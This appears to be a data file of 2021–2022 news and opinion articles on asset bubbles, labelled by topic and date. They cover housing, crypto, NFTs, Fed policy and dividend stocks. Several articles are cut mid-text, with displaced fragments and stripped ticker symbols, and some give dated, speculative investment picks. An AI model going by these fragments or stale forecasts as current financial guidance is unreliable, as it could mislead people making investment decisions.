“Incomes are solid, too, for homebuyers,” he said. “The people that are buying, they can afford it. Lending (requirements) got tighter, so you really have to go above and beyond” to qualify.

Plus, there’s not as much market speculation in Utah’s market, Eskic noted. While some areas such as Atlanta and Arizona are seeing investors make up about 40% of their housing markets, in Utah investors only make up about 15%, he said.

“So our market is driven by real people wanting housing,” he said.

#Utah is on the same trend as the US

there are only ~2K homes for sale!!! 🫥

Crashing inventory continues to plague our market going into the spring buying season#weneedmoreinventory #utpol #utecon https://t.co/s8QxAlFXWU pic.twitter.com/r5LCUcP7za — Dejan Eskic (@EskicDejan) March 31, 2022

Utah continues to see extremely low inventory with price increases driven by demand, so it’s hard to fathom a bubble popping in the foreseeable future, Eskic said.

“For a bubble to pop, in my opinion, you need oversupply,” he said. “It’s not a stock that people get frenzied into and all of a sudden it disappears. We’re talking about real physical assets that are occupied by people.”

So what should Utahns take away from the national research warning of signs of a bubble? Proceed with caution, Eskic said.

“It all depends on what your goals are,” he said. “If you are an investor, now is a really shaky time to invest.”

He noted rising interest rates have pushed prices even higher, pricing even more people out of the market.

“It’s an important thing not to overreact on any given part of the economy,” Eskic said. “Things go south when we overreact in a short time frame. That’s when things can really pop off.”

Eskic noted household economics do continue to appear strong, pointing to job growth in Utah and across the U.S.

“For prices to really crash,” Eskic said, “you need some black swan economic frenzy event and people can’t make their monthly payments.”

Is a bubble emerging?

Researchers wrote an asset, like housing, is in the “primary expansionary phase of a bubble when price increases are out of step with market fundamentals.” Rapid price increases alone “does not in itself signal a bubble.”

However, house prices can “diverge from market fundamentals,” researchers wrote, “when there is widespread belief that today’s robust price increases will continue.” If most buyers believe prices will continue to go up, “purchases arising from ‘a fear of missing out’ can drive up prices and heighten expectations” of continued price hikes.

That leads to price growth that may become “exponential” or even “explosive,” researchers wrote, “resulting in the housing market becoming progressively misaligned from fundamentals until investors become cautious, policymakers intervene, the flow of money into housing dries up and a housing correction or even a bust occurs.”

Those “expectations-driven, explosive” price increases, which researchers wrote is “often called exuberance,” has consequences, including “misallocation of economic resources, distorted investment patterns, individual bankruptcies and broad macroeconomic effects on growth and employment.”

Signs of a market ‘tipping point’

The researchers’ statistics show market “exuberance” — or when “prices are growing at an exponential rate exceeding what economic fundamentals would justify” — in both the 2000s and in 2021.

“The current reading indicates that the U.S. housing market has been showing signs of exuberance for more than five consecutive quarters through third quarter 2021,” researchers wrote.

The U.S. isn’t alone in this “housing market fever,” they noted. Eleven of 25 countries in their database show signs of exuberance.

What’s causing signs of a bubble?

The researchers point to concerning price-to-rent ratios and price-to-income ratios.

“Our evidence points to abnormal U.S. housing market behavior for the first time since the boom of the early 2000s,” researchers wrote. “Reasons for concern are clear in certain economic indicators — the price-to-rent ratio, in particular, and the price-to-income ratio —which show signs that 2021 house prices appear increasingly out of step with fundamentals.”

The researchers said historically low interest rates are a factor, but that they do not fully explain the U.S.’s housing market’s trends.

“Other drivers have played a role, including pandemic-related U.S. fiscal stimulus programs and COVID-19-related supply-chain disruptions and associated policy responses,” they wrote.

The resulting higher housing prices “may have fueled a fear-of-missing-out wave of exuberance involving new investors and more aggressive speculation among existing investors,” researchers wrote.

Since the beginning of 2020, the price-to-rent ratio has “soared beyond what observed fundamentals alone can explain,” researchers said.

“The gap between the actual price-to-rent ratio and its fundamental-based level in the U.S. has grown rapidly during the pandemic — comparable to the run-up of the last housing boom — and started showing signs of exuberance in 2021,” researchers wrote. “The exuberance statistic confirms that recent increases are far from ordinary.”

Another important factor, researchers wrote, is the ratio of house prices to disposable income. Data showing “episodes of exuberance” for that ratio “do not yet display evidence of explosiveness in the third quarter of 2021.” However, researchers warned the “rapid increase in the statistic” in 2021 “indicates that U.S. real house prices may soon become untethered from personal disposable income per capita.”

That delay, researchers said, is partly because of a “surge” in disposable income during the pandemic that led to slower growth rates in the price-to-income ratio, mostly due to financial COVID-19 stimulus efforts and household spending reductions due to restrictions and cutbacks.

“If disposable income increases turn out to be transitory — as fiscal stimulus wanes and the Federal Reserve reverses its accommodative monetary policy — recent patterns in the price-to-income ratio may prove a less-useful measure of housing affordability,” researchers noted.",Asset Bubble Burst,2022-03-31 07:00:00

It is no secret that the cryptocurrency industry has not been doing well for quite some time now. The major market correction in cryptos that began in May 2022 has left tokens across the board reeling. The world’s most popular cryptocurrency, (CRYPTO:BTC), dipped by 27% between May 4 and May 12, 2022.

Several cryptocurrencies saw major declines, kicked off by Terra’s collapse. LUNA went through a correction that resulted in losses for individual and institutional investors, ruining the lives of many cryptocurrency investors who placed full faith in the token.

The start of this month saw a degree of stability come back to the crypto industry. However, we might see further declines in some of the biggest names in the crypto world, including Bitcoin, , , and .

XRP token has already been in trouble due to the case Labs is fighting against the United States Securities and Exchange Commission (SEC). The crypto collapse made matters worse for the beleaguered crypto token.

What is happening? The cryptocurrency industry began with Bitcoin as the first major asset to come forth, and it laid the foundations for others to follow. By the end of 2013, there were over 50 different cryptocurrencies circulating in the market. The popularity of new cryptocurrency projects soared. 2014 ended with over 500 cryptocurrencies.

It is difficult to obtain accurate estimations, but there are believed to be over 18,000 cryptocurrencies in circulation today. It is safe to say that there are too many assets in the industry, and a lot of them are considered “junk” by experts. Web3 Foundation’s CEO, Bertrand Perez, remarked on the excessive number of cryptocurrencies at the World Economic Forum in Davos, Switzerland.

He highlighted the fact that the world is at a stage where there are too many blockchain networks out there and an unnecessary number of crypto tokens circulating in the market. The confusion created by an overwhelming number of cryptocurrencies also comes with a significant degree of risk for users.

Perez compared the cryptocurrency industry’s current state with the dot.com bubble. The start of the internet saw the rise of many dot.com companies, oversaturating the market. Many of those companies offered zero value, effectively scamming people. Once the bubble burst, only the legitimate businesses that offered real value remained.

Many experts believe that the cryptocurrency industry will have a similar fate. Many of the more obscure cryptocurrency projects might fade away into oblivion, leaving only the likes of Bitcoin and other major tokens behind.

Foolish takeaway The Bitcoin holders and investors who own other cryptocurrencies who managed to cash out before the May collapse managed to save their investment portfolios from utter ruin. Those who could not take their money out of the market in time may have no choice but to hold on for dear life and hope that, eventually, things will get better.

Bitcoin slumped to the US$30,000 mark after the May downturn. At writing, the world’s largest cryptocurrency hovers around those levels. However, the crypto token’s extreme volatility could see it plunge further in the coming months. Institutional investors may consider staying away from the sector entirely to avoid substantial losses.

Suppose the cryptocurrency industry goes through a similar situation to the dot.com bubble. Bitcoin and Ethereum are two of the cryptocurrency tokens that should survive the purge if it wipes out most of the “junk” cryptocurrencies in the market.

After the “worst inflation call in history” and its credibility shattered, Chair Jerome Powell will need to take the reins hard, says Allianz’s chief adviser Mohamed El-Erian. So we’ll see if a potentially sterner Fed knocks the S&P 500, which glided to a new high on Friday despite nosebleed consumer prices, off the Santa rally path.

On to our call of the day from a team at Stifel, led by Barry Bannister, warning of another bubble for the ages, thanks to “poor monetary and fiscal decisions since COVID-19.”

And maybe enjoy any Santa rally while it lasts, as the team sees a near-term correction taking the S&P 500 toward the low 4,000s by the first quarter of next year. And then…

“Later in 2022-23E, we believe the ‘behind-the-curve’ Fed might create the third bubble in 100 years, by 2023 to 6,750 for the S&P 500 (Nasdaq [approximately] 25,000),” said the Stifel team.

“Populism (which the Fed and Treasury seemingly embrace) leads to poor choices and even worse outcomes. Rate repression may again create a bubble that bursts (always do), followed by a lost decade,” it said.

It said investors should look to history for proof this can happen. The S&P 500 dropped nearly 20% in the third quarter of 1998 before the dot-com bubble burst in 1999-2000. A “late arriving” Fed tightening from the second-half of 1999 to the first half of the next year couldn’t stop it, said Bannister and the team.

“The same happened in the Roaring ’20s, with a -10.7% mid_Dec-1928 drop as rates rose before the Oct.-1929 crash,” the strategists added.

The only way to prevent such a bubble would be for the Fed to heed its own financial stability report, where it warned over elevated risk appetite among retail investors and high equity and real estate valuations, and “tilt hawkish.”

“Still, policy may arrive too late, and if the market goes ‘risk-on’ with a falling Equity Risk Premium and if the 10Y Treasury Inflation Protected Security (TIPS) yield remains repressed at -1.0% due to global central banks, a P/E [price-earnings] convexity bubble in 2022-2023E may occur,” they said.

While the big one may be a way off, they offer a near-term survival guide. Bannister and his team said if both the S&P 500 and commodities weaken simultaneously — they expect that due to dollar strength, a China growth slowdown, Fed exit signals and tighter global liquidity —investors can take refuge in S&P 500 defensives. So healthcare, consumer staples, utilities and telecommunications are the safety spots of choice, for now.

The US Federal Reserve's tightening monetary policy from a historically low-interest rate has slowed the US stock markets. As a result, traders quickly attempt to adjust their capital allocation levels as risk assets, technology, and US major indexes roll lower because of expected Fed Rate Hikes and other Hawkish activities.

We will explore how the US Fed's comments and potential future actions may prompt significant market trends in 2022 and beyond. We'll also attempt to identify how and when the US Fed may disrupt the US markets. We know the actions of the US Fed will prompt some significant trends over the next 12 to 24 months. We know certain assets will likely rise in value as fear settles into the markets because of rising interest rates and deflating asset bubbles. It is just a matter of understanding how the speculative asset bubble of the past 8+ years and how the US Fed may move to pop these speculative bubbles soon.

Asset Bubbles Everywhere, The Global Markets Continue To Froth

Asset bubbles, such as those created in Cryptos, the US stock market, US Real Estate, and the art/collectible market over the past 5+ years, have visualized the US Fed's easy money results in terms of bubbles.

Take a look at this chart showing the growth in certain asset classes since the start of 2019. It is incredible to think that these asset classes have rallied so far and so fast in just over 35 months:

The Grayscale Bitcoin ETF rallied more than 1200%.

The Technology sector rallied more than 200%. Real Estate rallied more than 85%.

The S&P 500 rallied more than 94%.

The US Federal Reserve's move to lower interest rates after the 2018 market collapse, which resulted in a December 24, 2018, Christmas Bottom, prompted an incredible rally phase where traders followed the US Fed in piling into assets. As long as the US Fed continued buying assets and kept interest rates near zero, global traders had no reason to fight the US Fed.

Is The US Fed About To Pop The Bubble From The Stratosphere?

Our research suggests the US Federal Reserve is changing its policy a little late into the game. However, it appears the US and global markets have already ""rolled over"" in terms of growth trends and expectations. This SPY to QQQ ratio chart highlights that the US markets entered a peaking phase in late July/August 2020 and reached an ultimate peak in February 2021.

S&P 500 P/E Ratio Suggests Investors Are All-In For The Next 90+ Years

In other words, it appears traders have reached their ceiling in terms of what they believe the US Fed is capable of doing at this stage in the rally. For example, the P/E Ratio of the US stock market ending in 2021 ended just below 30, with a historical high for 2021 near 37. The historical mean is 15.96 - which is still relatively high for the US stock market.

Remember, a P/E level of 15.96 means any investor buying in at those levels would need a minimum of 15.96 years of a company handing over ""every penny of revenue"" to the investor (excluding all costs, payrolls, taxes, fees, and other operating expenses) to cover the P/E multiple of the investment. So a P/E level of 30, as we see at the end of 2021, suggests that stock price valuation levels are at least 60 to 90+ years ahead of real returns.

The only thing that can change this historic level of speculation in the markets is a deleveraging/revaluation event.

They're being fueled by historically low interest rates -- but also investors and economists' belief that the housing market has a unique ability to support runaway prices.

That's the current state of America's housing market , but it could also describe the US housing bubble that inflated from 2004 through early 2007, before prices crashed and wreaked havoc on the economy and the global financial system. That led to the Great Recession, the biggest body blow that the US economy has suffered since the Great Depression. It produced massive, prolonged unemployment and the greatest destruction of household wealth in the nation's history.

Most economists and investors aren't focused on the housing market right now. Their attention is on other factors dogging the economy, such as a labor shortage supply chain disruptions and of course the ongoing pandemic , which has been at least partly the cause of all of those problems.

The good news is that few economists believe that the current run-up in housing prices is a bubble that's about to burst, taking the economy down with it.

The bad news is that practically no one was worried about the housing bubble in 2007, either.

Few saw the last bubble in time

Former Federal Reserve Chairman Alan Greenspan famously insisted in 2005 that there was no bubble. Instead, he said America had a large number of small bubbles in some home markets scattered around the country.

""Although a 'bubble' in home prices for the nation as a whole does not appear likely, there do appear to be, at a minimum, signs of froth in some local markets where home prices seem to have risen to unsustainable levels,"" he said in congressional testimony on June 9, 2005.

He was not alone in his assessment.

Credit-rating agencies gave top scores to mortgage-backed securities -- assets backed by the payments due on home loans with questionable underwriting rules.

Economists and investors widely believed that the questionable lending practices would be covered by the rising home values, allowing borrowers to sell the homes at a profit and pay off the loan if they couldn't afford the payments. Wall Street firms and banks rushed to buy those securities.

A building boom in the early years of this century helped to feed swelling home inventories and high vacancy rates. Still, economists believed the rising pace of home ownership meant that there was an nearly endless supply of buyers who would be able and willing to pay, despite surging home prices.

But, of course, the price increases did end. By February 2007 home prices would start to decline, losing 26% of their value before bottoming out, according to the widely followed S&P CoreLogic Case-Shiller national home price index.

Have people learned their lesson? Maybe not.

Housing prices are rising faster, higher than during the bubble

The previous record for rising home prices was a 14.4% year-over-year gain in the fall of 2005, according to Case-Shiller. The US housing market blew past that mark in April of this year, with a new record set every month since. Year-over-year prices increases now stand at 19.9%.

The median price of existing homes now stands at $352,800, according to the National Association of Realtors.

Home values stand at one third more than the peak of the last bubble in early 2007, Case-Shiller reports. And by just about every measure, housing affordability has plunged, even as near-record-low mortgage interest rates has kept home payments in check.

And yet economists forecast even more price increases ahead. Zillow projects that national home price increases will slow but not start to decline. It sees 13.6% growth from September 2021 through September of 2022, a faster pace of increase than its previous forecast. Goldman Sachs forecast earlier this month that prices would rise another 16% by the end of 2022.

Belief is that prices won't crash this time

It's enough to cause PTSD, or at least déjà vu, among those who lived through the last housing bubble. Still, many of those who rang alarm bells last time don't think we're in for a repeat of the catastrophic bursting of the bubble this time around.

""I don't think we'll see prices fall 20% to 30% once again,"" said Dean Baker, senior economist and co-founder of the Center for Economic Policy and Research. ""I don't think there's that kind of story out there."" But he cautioned that even a modest rise in interest rates could lead home prices to slide between 5% and 8%. The Federal Reserve expects it will soon start to taper the support it is providing to the economy.

Mark Zandi, chief economist at Moody's Analytics, said he is worried that the housing market is in for a hard landing. But the market and economy won't crumble like last time, he expects.

""The housing market is out of whack. It's not sustainable. It is overvalued, stretched and vulnerable as [mortgage] rates rise, and affordability gets crushed,"" he said. ""But I'm not concerned we're going to have a crash.""

He home prices increases will level out, falling in some areas of the country while gaining modestly in others.

Zandi, Baker and others believe much stronger underwriting standards on the overwhelming majority of home loans today will prevent a repeat of 2007. And the home building boom of the early years of this century is also missing -- there's no excess inventory of housing and no high vacancy rates. In fact, vacancy rates are near record lows, not record highs.

However, perhaps most bearish expert about the current housing market, Ivy Zelman, CEO of Zelman Associates, thinks the so-called housing shortage is an illusion.

She believes those estimates ignore broader trends like slowing population growth and low rates of new households being formed.

She believes the current pace of building may already be a bit greater than needed. She's worried that with the amount of building in the pipeline, thanks to outside investors entering the market, there soon could be a glut of homes on the market.

But Zelman doesn't believe there will be another collapse in housing prices like the last time. She said that a rise in the 30-year fixed rate mortgage from the current 2.9% to about 4% could be enough to send prices lower.

""A lot of what we're seeing is scary,"" she said. ""We don't know what will happen with interest rates. Some builders are saying, 'We don't have wait lists any more.' But a lot of people are drinking the Kool-Aid and get complacent.""",Asset Bubble Burst,2021-10-27 07:00:00

If you’re reading this article, you probably know that in 2021, an NFT of Jack Dorsey’s first-ever tweet initially sold for US$2.9m. You likely also know that the owner of that same NFT recently tried to auction it off for $48m and received a top offer of $280. Not a great ROI.

Is this an anomaly, a crash to earth for NFT prices, or the beginning of a paradigm shift in which the utility of NFTs will come into focus as brands move to practical and loyalty-driven applications for the technology?

Who’s playing?

There are essentially four types of ‘investors’ who came to play in the NFT space. There are the first adopters who got in early, not unlike bitcoin investors back in 2010. These groups had no idea what the future held but believed there was intrinsic value in the assets they were acquiring. Next, you have the speculators who jumped on board in 2021 because they saw an opportunity to make money. Pure and simple. Then you have the investors who have been building a vault of NFT assets for long-term value growth. Finally, you have the masses who are coming to the realisation that the chance to buy low and sell high while making millions in the process likely had a very short window of opportunity which has now closed as evidenced by the anecdote above concerning Jack Dorsey’s NFT tweet.

Where we are today

Digital images of Apes and Kittens have sold for millions. However, we need to look at who is buying and how they got there. And is the current situation really relevant as a business model?

There are many investors with deep pockets who came to the game in 2021 during the growth of the bubble. They saw value in being early to market in terms of acquiring NFTs and didn’t hesitate to acquire these assets at extremely high prices.

However, there is another group who came to the party under different circumstances and we don’t hear much about them.

If you were among the lucky group of early-stage ETH backers in the initial crowd sale, you acquired ETH for the equivalent of pennies. And for many of those who held ETH at that original price point, handing over a few of them to acquire a Bored Ape Yacht Club image takes on a different meaning than if you had acquired ETH over the past 12 months at a much higher cost. In other words, for many ETH holders, the value of the asset they are exchanging may not hold the same weight as for someone who acquitted ETH at a much higher price point.

Unfortunately, many speculators, in the true sense of the word, acquired NFTs on platforms such as OpenSea with the sole intent of flipping them for a significant profit. A quick study of recent drops shows some buyers acquiring their assets at, say, 0.25 ETH and trying to flip them shortly thereafter for 3 ETH. And more and more we’re seeing trade secondary sales fail because of their speculative nature.

Where are we going?

As the early NFT bubble begins to deflate, rather than burst outright, the voice of brands looking for opportunity is getting louder. Unlike individual sales and the drive to ‘make a killing’ by flipping NFTs, brands will be looking to create value or utility for users, customers and loyalists.

Stephen padveeen, t2 marketing international

Big brands like Asics, Coca-Cola, Taco Bell, McDonald’s and the NFL have all made moves into the NFT space. And most have been very strategic by testing the space and donating all or part of the proceeds to charitable causes. Of course, these brands have strong recognition behind them so it’s easy to understand why they are taking the early plunge into the space but even they are looking for ways to create that real value proposition for their customers.

Lesser known brands will be faced with the challenges of identifying opportunities while determining how to create perceived and actual value with their campaigns. Brands will want to know if digital art is the only NFT application or is it truly just the first step in what will become a revolutionary shift in the way they think about and create marketing as a means of connecting with their audience, engaging them with the brand and building customer loyalty.

How will we get there?

NFTs go far beyond the current digital art format. They can deliver unlockable digital experiences, access to ‘members only’ benefits and merchandise, vested ownership of physical goods, retail marketing opportunities, additional revenue streams and the simple bragging rights of owning a unique, brand-specific NFT.

Collectors, buyers, backers, investors, advocates and admirers must see an inherent value in the assets you create.

And the marketing tactics needed to reach these targets will require a revolutionary way of thinking. The content you create, the messaging you share, your presence on social channels and Discord, will all play a part in generating excitement about your NFT collection and the overall value you deliver to users.

NFTs may offer the opportunity for creating long-term brand loyalty and customer advocacy like no other marketing initiative. The challenge now lies in identifying the framework for success and choosing the right path while creating the appropriate NFT assets.

Welcome to the world of stock investing! The recent growth stock bubble burst, including the meltdown of many high-growth tech stocks, can scare new investors away. While there are growth stocks driven by great businesses, you’ve got to filter the list carefully. If you’re not sure, you don’t have to take those risks.

Your hard-earned savings are too precious to lose. Make your first stock investments count. Allow them to compound your wealth in more defensive stocks. The Rule of 72 approximates that if you can get a rate of return of even just 10%, you can double your investment in about seven years.

It’d be smart to start investing in solid dividend stocks that provide stable returns from dividends alone. Stable long-term growth further lead to price appreciation and sometimes dividend growth as well. Here are some reasonably valued and low-risk dividend stocks that provide decent dividend income and are worthy for new investors to investigate.

RBC stock Royal Bank of Canada ( :TSX: )(NYSE:RY) is a leading Canadian bank that’s driven by a diversified business. Here’s how it has performed in the long run. In the past 10 years, it increased its earnings per share (EPS) at a compound annual growth rate (CAGR) of about 9.5%. In the period, it increased its dividend per share (DPS) by approximately 7.6% per year. The annualized total returns were about 10.9%, including dividend returns of roughly 2.5% and price appreciation of 8.4%.

At $132 and change per share, RBC stock trades at a reasonable multiple of roughly 11.7 times this year’s estimated earnings. At writing, it provides a yield of over 3.8%. Assuming the bank achieves its target EPS growth rate of 7%, then we can approximate estimated long-term returns of 10.8% per year on the fairly valued stock.

It’s not a bad time to pick up some bank stocks that can benefit from a rising interest rate environment. New investors can consider parking their money in the quality bank and expect long term, steady price appreciation and dividend growth.

Just note that any deterioration of the North American economic health can negatively impact the bank’s performance. For example, in the last two recessions, RBC stock corrected +40% and +28%, respectively. Those proved to be excellent long-term buying opportunities for the leading bank that isn’t going away, as it recovered and made new heights after that.

Everyone prefers to get more dividends. Here’s NorthWest Healthcare Properties REIT (TSX:NWH.UN), which offers juicy monthly cash distributions.

NorthWest Healthcare Properties REIT At $12.84 per unit at writing, NorthWest Healthcare Properties REIT offers a yield of 6.2%. The healthcare REIT is globally diversified and enjoys inflation-indexed cash flows, which should help it combat rising interest rates.

At the end of Q1, the REIT’s net asset value (NAV) stood at $14.73 per unit. So, it trades at a discount of about 13% to its NAV. Analysts are even more bullish on the stock with a 12-month target price of $15.31 per unit across eight analysts. This target implies near-term upside potential of about 19%. Combined with the dividend, that’s a near-term total return estimate of roughly 25%.

Notably, Canadian REITs pay out cash distributions that are taxed differently than dividends in non-registered accounts. For example, last year, 46% of NorthWest’s distributions were return of capital, 40% were other income, and 14% were capital gains. The return of capital portion reduces unitholders’ cost basis and is ultimately taxed like capital gains when investors sell. So, it can also be viewed as tax-deferred income. Half of capital gains are counted as taxable income. The other income portion is taxed at your marginal tax rate.

A: There's no question that what happens in the United States will have an impact on the rest of the world.","WASHINGTON -- With inflation barging ahead, the U.S. Federal Reserve is set to raise interest rates at its policy meeting in March.

What are the risks of such moves? Nikkei asked Desmond Lachman, a senior fellow at the American Enterprise Institute and former deputy director in the International Monetary Fund's Policy Development and Review Department.

Edited excerpts of the interview follow.

Q: What are your expectations for the March meeting of the Federal Open Market Committee?

A: They're starting from interest rates at zero percent. It means that they've got quite a lot of interest rate hikes to do during the cycle, just to get interest rates back to levels that are positive in real terms.

Even if they raise interest rates by one, two, three times during the remainder of the year, the monetary policy would be remaining very supportive, at a time that inflation is running very high.

Q: Chair Jerome Powell has stated that the Fed will be ""humble and nimble"" in the fight against inflation. Do you think the Fed is behind the curve?

A: Oh, absolutely. The Fed is totally behind the curve, and one of the reasons that Chairman Powell is saying that he's got to be ""humble and nimble"" is that the Fed got it very wrong last year.

The Fed was saying that inflation was going to be only 1.8% for the whole year, and even by their own measure inflation turned out to be something like 5%. It's been three times the amount that the Fed had expected.

They got the supply-chain issues totally wrong. They thought things would clear up very quickly. They kept monetary policy far too loose for far too long.

Q: What are the risks with the upcoming tightening? Are there fears that the Fed will rush to kill inflation and overkill the economy?

A: The Fed's got a very big problem that it's created for itself in that not only do we have price inflation, but we have asset price inflation. What happened last year is, because they were buying such large quantities of bond, it created an equity price bubble, so we've got equity valuations now at levels that we've only seen once before in the last hundred years.

There's bubble-like conditions in the equity market, and the same thing with the housing market in the United States, that house prices, today, even if you adjust for inflation, they're higher than they were in 2006, before the last housing bust occurred.

Those bubbles in the equity and the housing markets, they've been premised on the assumption that interest rates would stay low forever. So, as soon as the Fed starts raising interest rates in an aggressive way, there's the real risk that it bursts the asset price bubbles and that could, then, move us into a recession. One's seeing that already with the tech routs.

Q: The market looks like it's losing confidence in the Fed.

A: If the markets perceive that the Fed is behind the curve, then you'll get a big sell-off in the bond market. We've had that before. So far, what the market has done is it's given the Fed the benefit of the doubt, saying, 'We buy your view of the supply-side problems that inflation is only a temporary factor, that supply-side issues will ease up and inflation will come down.'

But, if we do see inflation numbers, if we see the consumer price inflation continuing to be 7% month after month, then markets will lose credibility, they'll push the bond yields up, they'll be selling the bonds, and that will be putting pressure on the stock market.

My expectation is you're going to have a lot of volatility [in] the year ahead, you know, and I fear that what we could very well see is the bursting of the asset and the housing market bubbles later this year.

Q: What will be the ripple effect of a U.S. interest rate hike on the world, especially on emerging markets?

A: There's no question that what happens in the United States will have an impact on the rest of the world. As the Fed goes to a tighter policy, money will come back to the United States, partly because there'll be higher interest rates in the United States, partly because the dollar is likely to strengthen as United States interest rates go up. So, this could put a lot of pressure on the emerging market economies.

AEI senior fellow Desmond Lachman says the U.S. needs to mend its ways in managing budget deficits.

What worries me as well is that, as the Fed is tightening, the Chinese economy is slowing down at a rapid rate, and China looks like it's got real problems in its property sector. In 2022, the United States economy will be having tighter monetary policy and slower economic growth, but China will be slowing down at the same time.

That is a very bad combination for the emerging market economies, because China is the world's largest consumer of internationally traded commodities. We could see commodity prices coming off. This is likely to be difficult for the emerging market economies next year.

Q: Meanwhile, fiscal deficit is expanding in the U.S.

A: There's no question that the long-run outlook for the dollar is not good, that what we've got is record levels of public debt, we've got record budget deficits, that those deficits aren't going to be reduced anytime soon.

What could be good for the dollar in the long run is that it doesn't have serious competitors. If China is in trouble, it means the renminbi can't be a serious competitor to the dollar, and we could also have a renewed bout of the eurozone debt crisis because countries like Italy, Portugal, Spain have got very high public debt levels and once the ECB stops providing support through its bond-buying programs, we could get a renewal of eurozone tensions.

The dollar could be saved for that reason -- not because the dollar is good but because it's just better than the other countries.

But the United States really needs to mend its ways, because there's no way that you can keep running budget deficits like this, keep running up the public debt, without getting into trouble, and then asking foreigners to buy your bonds.

What is of concern is that there isn't any serious consensus on getting the budget in order. We don't have any constituency, either in the Democratic Party or the Republican Party, for serious budget measures, to bring the deficit down in a reasonable way. There's no real long-term plan for dealing with the budget deficit.

I'm not saying that you don't need additional public expenditures or we don't need infrastructure expenditures. If you do need those, what you also need to do is to have the taxes that finance them.",Asset Bubble Burst,2022-02-15 08:00:00

Similarly, Japanese holding company Nomura Holdings (NYSE: ) announced in May the creation of a digital asset company this year.","Why Are Asian Wealth Managers Wary of Digital Assets?

A study by consulting firm Accenture (NYSE: ) revealed that many of these companies still have a few reservations about investing in digital assets.

Although the demand for these products has grown significantly in recent years, most of the companies consulted have no plans to offer these products.

Digital assets represent a $54 billion income opportunity for investors, the consulting firm noted.

Despite growing demand for digital assets in Asia and around the world, wealth managers in the region are being extra cautious about offering such products to their wealthy clients, a survey by Accenture has revealed.

The Ireland-based consultancy’s study published on Monday indicated that wealth managers are not offering cryptocurrencies, NFTs, futures, and other digital assets, because they still do not fully understand these investment options.

Although the crypto industry has grown rapidly since the start of the pandemic, driven in part by the gigantic stimuli injected into the economies of the most industrialized countries, global banks have been very cautious about this type of investment.

Accenture reported the results of the study that have to do with strategic consulting, technology services, and Accenture’s projections on the future of Asia’s wealth management industry, according to Reuters.

""Currently, 52 percent of affluent investors in Asia hold digital assets of some sort. Accenture's research indicates this could reach 73 percent by the end of 2022,"" the company said.

An Overlooked Income Opportunity

Accenture mentioned that “digital assets represent 7% of surveyed investors' portfolios - making it the fifth-largest asset class in Asia - more than they allocate to foreign currencies, commodities or collectables.”

And it added that despite these figures still “two-thirds of wealth management companies have no plans to offer digital assets.” Accenture’s report was based on two surveys, one to gauge the opinion of some 3,200 investors and the other to determine where wealth management companies in Asia are directing their investments. About 500 financial advisers participated in the survey. Both studies were conducted between December 2021 and last January.

According to the consulting firm's findings ""for wealth management firms, digital assets are a $54 billion revenue opportunity - that most are ignoring.""

On the Flipside

Some analysts and experts believe that the current market situation is not just a situation, but something deeper.

Web3 Foundation CEO Bertrand Perez predicted that the crypto bubble could burst at any moment, dragging 95% of crypto and blockchain projects with it.

Meanwhile Some Banks Have Taken the Initiative

The report explained that “among firms' barriers to action are a lack of belief in (and understanding of) digital assets, a wait-and-see mindset, and - given that launching a digital asset proposition is operationally complex - choosing to prioritize other initiatives.” However, some banks in Asia have been working with cryptocurrencies for a couple of years. DBS Group (OTC: ), the largest financial institution in Southeast Asia, launched its own cryptocurrency trading platform in December 2020.

This option allows its corporate clients and large investors various crypto asset trading services for many digital products.

Similarly, Japanese holding company Nomura Holdings (NYSE: ) announced in May the creation of a digital asset company this year. Thus, institutional investors will be able to do business linked to the exchange of cryptocurrencies and other operations.

That has led to an ‘everything bubble’ which has impacted almost every asset class, from stocks to property to fine art.
Regardless of your view on the global pandemic response, the direct effect has been to create the greatest asset bubble the world has ever seen.
This has served to massively enlarge the fortunes of the rich, who own almost all Australia’s stocks and property.
Unless you believe that this time is really different (hint: it never is), there will inevitably be an almighty reckoning.","In 1999 almost everyone (other than the gullible or greedy) figured the bubble would burst at some point — but as Citibank’s later disgraced CEO Chuck Prince would note (in relation to a different) bubble: “as long as the music is playing, you’ve got to get up and dance”.

Back then the heroes were AOL, Amazon, Webvan and Microsoft (note: two of those are among the world’s most valuable businesses today), but the mania affected the entire market. The fall was swift. The tech-laden Nasdaq dropped from 5047 in March 2000 to 1139 in September 2002. That’s a 77% drop — for an index. The Dow Jones dropped a more pedestrian but still painful 20%.

Fast-forward two decades and the mania is even more manic.

Although the first internet boom involved many businesses that didn’t yet have revenue (speculators would purchase companies that had lots of clicks), at least the cost of money was semi-rational — interest rates in 1999 were about 8%. Today, coordinated actions from inept (and possibly corrupt) central banks have meant that real interest rates in Europe, the United States and Australia remain below zero (in some places the nominal rates are less than zero, so people are paying banks to hold their money).

That has led to an ‘everything bubble’ which has impacted almost every asset class, from stocks to property to fine art. If you’re purchasing almost any asset now, you’re essentially betting that central banks are (1) able to influence interest rates in the medium term, which is highly debatable, and (2) can maintain record low interest rates despite inflation starting to resemble Germany in the early 1920s.

Why are the world’s two most valuable companies, Microsoft and Apple, trading on P/E ratios of 37 and 27 respectively? Because their income streams (which are considered to be almost recurring) are effectively a de facto for government bonds, which provide a near-zero return.

In the past year the Nasdaq is up 34%, the S&P500 is up 34%, crude oil is up 109%, coal is up 117% and Bitcoin is up by more than 300%. The Australian S&P200 is a relative laggard — up only 21%.

How overpriced is the US market in relative terms? There are two indicators which tend to provide a good understanding. First is the CAPE Shiller Index, which looks at a 10-year average of price earnings multiples (adjusted for inflation). The index has only hit 40 once previously, in 1999. It recently hit 40 again.

The other useful long-term measure is Warren Buffet’s GDP to Market Capitalisation Index (he uses the Wiltshire 5000, which is a very broad measure of listed US businesses). The index compares the total value of all publicly traded stocks in a country, divided by that country’s gross domestic product.

The logic is sound — companies reflect economic output, the value of capital stock in an economy will eventually reflect production levels. If share prices get too high relative to GDP it’s like ringing a bell. How is that all going? Well, the historical average for Buffet’s index is 75%. We’re currently at 200%, a level never before reached. There’s more chance of my five-year-old daughter being accepted into Hogwarts next year than this ending well.

The pandemic has exacerbated underlying problems in the global economy. The EU and US (not to mention Australia) cranked up the virtual printing presses to fund shutting down their economies during COVID-19. Regardless of your view on the global pandemic response, the direct effect has been to create the greatest asset bubble the world has ever seen. This has served to massively enlarge the fortunes of the rich, who own almost all Australia’s stocks and property.

Case in point: the total wealth of the The Australian Financial Review’s annual rich list has increased from $283 billion in 2018 to $480 billion in 2021. That’s right — Australia’s richest 200 people have almost doubled their wealth in the past three years alone. During that period Australia’s GDP has barely increased. So the rich have got far richer, and that means everyone else has got poorer (they just don’t realise it yet because house prices are nominally higher).

